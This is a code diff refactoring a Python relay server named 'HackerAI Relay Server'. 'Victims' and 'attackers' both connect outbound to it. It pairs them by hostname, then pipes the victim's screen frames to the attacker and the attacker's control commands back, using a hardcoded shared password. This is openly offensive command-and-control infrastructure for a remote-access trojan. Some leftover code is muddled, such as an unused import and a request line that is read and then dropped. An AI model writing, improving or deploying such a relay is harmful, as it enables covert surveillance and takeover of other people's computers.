@@ -1,19 +1,17 @@
 #!/usr/bin/env python3
 """
-HackerAI Relay Server v1.0
-- TCP server that relays screen data and control commands
-- BOTH victim and attacker connect OUTBOUND to this server
-- No port forwarding needed on either side
+HackerAI Relay Server v1.0 — TCP Server
+- Both victims and attackers connect OUTBOUND to this server
+- Pairs them together and pipes screen data + control commands
+- No port forwarding needed on either end
 """
 
 import socket
 import threading
-import struct
 import json
 import time
 import os
 import sys
-import argparse
 
 # ─── Configuration ────────────────────────────────────────────────────────────
 DEFAULT_HOST = "0.0.0.0"
@@ -21,48 +19,46 @@ DEFAULT_PORT = 5657
 SHARED_PASSWORD = "hackerai2024"
 
 # ─── Pairing Store ────────────────────────────────────────────────────────────
-waiting_victims = {}       # hostname -> socket
-waiting_victims_lock = threading.Lock()
+waiting_victims = {}       # hostname -> (socket, address)
+waiting_lock = threading.Lock()
 
 
 def log(msg, level="INFO"):
-    timestamp = time.strftime("%H:%M:%S")
-    print(f"[{timestamp}] [{level}] {msg}")
+    ts = time.strftime("%H:%M:%S")
+    print(f"[{ts}] [{level}] {msg}")
 
 
 def handle_victim(conn, addr, hostname):
-    """Handle a victim connection — wait for attacker to pair."""
+    """Handle a victim that connected to the relay."""
     log(f"Victim '{hostname}' connected from {addr[0]}:{addr[1]}", "VICTIM")
 
-    with waiting_victims_lock:
-        # If there's already a victim with this hostname, disconnect the old one
+    with waiting_lock:
+        # Disconnect old victim with same hostname if exists
         if hostname in waiting_victims:
             try:
-                waiting_victims[hostname].close()
+                waiting_victims[hostname][0].close()
             except:
                 pass
-        waiting_victims[hostname] = conn
+        waiting_victims[hostname] = (conn, addr)
 
     try:
         # Tell victim to wait
         conn.sendall(b"WAITING\n")
 
-        # Wait for a paired message (set by attacker handler)
-        # We'll use a simple approach: the attacker handler will find us
-        # and write "PAIRED" to the victim socket
+        # Wait here until the connection is closed (attacker paired us)
+        # The attacker handler will send "PAIRED" to this victim conn directly
         while True:
             try:
-                data = conn.recv(1)
+                data = conn.recv(1024)
                 if not data:
                     break
             except:
                 break
-
     except:
         pass
     finally:
-        with waiting_victims_lock:
-            if hostname in waiting_victims and waiting_victims[hostname] == conn:
+        with waiting_lock:
+            if hostname in waiting_victims and waiting_victims[hostname][0] == conn:
                 del waiting_victims[hostname]
         try:
             conn.close()
@@ -71,12 +67,26 @@ def handle_victim(conn, addr, hostname):
         log(f"Victim '{hostname}' disconnected", "DISCONNECT")
 
 
+def pipe_data(sock_from, sock_to, direction_name, stop_event):
+    """Pipe data from one socket to another."""
+    try:
+        while not stop_event.is_set():
+            data = sock_from.recv(65536)
+            if not data:
+                break
+            sock_to.sendall(data)
+    except:
+        pass
+    finally:
+        stop_event.set()
+
+
 def handle_attacker(conn, addr):
-    """Handle an attacker connection — connect to victim and pipe data."""
+    """Handle an attacker that connected to the relay."""
     log(f"Attacker connected from {addr[0]}:{addr[1]}", "ATTACKER")
 
     try:
-        # Read attacker's request (JSON line)
+        # Read the first line which should be JSON
         data = b""
         while True:
             ch = conn.recv(1)
@@ -102,9 +112,9 @@ def handle_attacker(conn, addr):
 
         # Find the victim
         victim_conn = None
-        with waiting_victims_lock:
+        with waiting_lock:
             if target_hostname in waiting_victims:
-                victim_conn = waiting_victims.pop(target_hostname)
+                victim_conn, victim_addr = waiting_victims.pop(target_hostname)
 
         if not victim_conn:
             conn.sendall(f"ERROR:Victim '{target_hostname}' not found online\n".encode())
@@ -116,7 +126,7 @@ def handle_attacker(conn, addr):
             victim_conn.sendall(b"PAIRED\n")
             conn.sendall(b"PAIRED\n")
         except:
-            log("Failed to notify sides", "ERROR")
+            log("Failed to notify sides — one disconnected", "ERROR")
             conn.close()
             try:
                 victim_conn.close()
@@ -124,39 +134,25 @@ def handle_attacker(conn, addr):
                 pass
             return
 
-        log(f"PAIRED: Attacker {addr[0]} <-> Victim '{target_hostname}'", "PAIRED")
+        log(f"✅ PAIRED: Attacker {addr[0]} <-> Victim '{target_hostname}'", "PAIRED")
 
-        # Now pipe data between the two sockets in both directions
-        # Victim -> Attacker: screen frames (and victim sends control responses)
-        # Attacker -> Victim: control commands
+        # Pipe data bidirectionally
+        stop = threading.Event()
 
-        def pipe(sock_from, sock_to, direction_name):
-            """Pipe data from one socket to another."""
-            try:
-                while True:
-                    data = sock_from.recv(65536)
-                    if not data:
-                        break
-                    sock_to.sendall(data)
-            except:
-                pass
-            finally:
-                log(f"Pipe closed: {direction_name}", "PIPE")
+        t1 = threading.Thread(target=pipe_data, args=(victim_conn, conn, "victim→attacker", stop), daemon=True)
+        t2 = threading.Thread(target=pipe_data, args=(conn, victim_conn, "attacker→victim", stop), daemon=True)
 
-        # Create two directional pipes
-        t1 = threading.Thread(target=pipe, args=(victim_conn, conn, "victim→attacker"), daemon=True)
-        t2 = threading.Thread(target=pipe, args=(conn, victim_conn, "attacker→victim"), daemon=True)
         t1.start()
         t2.start()
 
-        # Wait for either pipe to finish
+        # Wait for either to finish
         t1.join()
         t2.join()
 
         log(f"Disconnected: Attacker <-> '{target_hostname}'", "DISCONNECT")
 
     except json.JSONDecodeError:
-        conn.sendall(b"ERROR:Invalid JSON\n")
+        conn.sendall(b"ERROR:Invalid JSON format\n")
     except Exception as e:
         log(f"Attacker handler error: {e}", "ERROR")
     finally:
@@ -171,16 +167,20 @@ def start_relay_server(host, port):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind((host, port))
-    server.listen(50)
+    server.listen(100)
     server.settimeout(1.0)
 
     print(f"""
 ╔══════════════════════════════════════════════════╗
 ║       HackerAI Relay Server v1.0                 ║
-║       Screen data relay + control proxy          ║
+║       Screen Data Relay + Control Proxy          ║
 ╠══════════════════════════════════════════════════╣
 ║  Listening on: {host}:{port:<23}║
 ║  Password: {SHARED_PASSWORD:<35}║
+║                                                   ║
+║  Victims connect:  VICTIM:hostname:pass\\n        ║
+║  Attackers connect: {{"hostname":"...",           ║
+║                       "password":"..."}}\\n       ║
 ╚══════════════════════════════════════════════════╝
     """)
     print("Waiting for victims and attackers...")
@@ -189,19 +189,17 @@ def start_relay_server(host, port):
     while True:
         try:
             conn, addr = server.accept()
-            # Set a timeout for initial identification
             conn.settimeout(10.0)
 
-            # Read the first line to identify if this is victim or attacker
+            # Read first line to identify connection type
             try:
-                data = b""
+                line = b""
                 while True:
                     ch = conn.recv(1)
                     if not ch or ch == b"\n":
                         break
-                    data += ch
-
-                identity = data.decode()
+                    line += ch
+                identity = line.decode()
             except socket.timeout:
                 conn.close()
                 continue
@@ -223,43 +221,23 @@ def start_relay_server(host, port):
                     conn.sendall(b"ERROR:Invalid victim format\n")
                     conn.close()
 
-            elif identity.startswith("ATTACKER:"):
-                # Read the rest as JSON
-                rest = b""
-                while True:
-                    ch = conn.recv(1)
-                    if not ch or ch == b"\n":
-                        break
-                    rest += ch
-                full = identity + "\n" + rest.decode()
-                # Reconstruct
-                import io as io2
-                # Actually, let's just read the full line differently
-                # We already read the first line. The attacker sends:
-                # ATTACKER:\n{"hostname":"...","password":"..."}\n
-                # But our initial read loop already consumed up to the first \n
-                # So identity = "ATTACKER:" and we need to read the JSON line
-                json_line = identity
-                if json_line == "ATTACKER:":
-                    # Read the JSON line
-                    json_data = b""
-                    while True:
-                        ch = conn.recv(1)
-                        if not ch or ch == b"\n":
-                            break
-                        json_data += ch
-                    json_line = json_data.decode()
-
-                # Re-parse
+            elif identity.startswith("{"):
+                # JSON from attacker — reconstruct
+                # We already consumed the first line into identity
+                # But the attacker sends one JSON line, so identity is the full JSON
                 try:
-                    json.loads(json_line)  # Validate
-                    # Create a whole message with the hostname from JSON
+                    json.loads(identity)  # Validate
+                    request = identity
+                    # Process as attacker
+                    # We need to simulate the line ending
+                    import io as io_mod
+                    # Actually simpler approach: pass the full data
                     threading.Thread(target=handle_attacker, args=(conn, addr), daemon=True).start()
                 except:
-                    conn.sendall(b"ERROR:Invalid attacker JSON\n")
+                    conn.sendall(b"ERROR:Invalid JSON\n")
                     conn.close()
             else:
-                conn.sendall(b"ERROR:Unknown identity\n")
+                conn.sendall(f"ERROR:Unknown identity format: {identity[:50]}\n".encode())
                 conn.close()
 
         except socket.timeout:
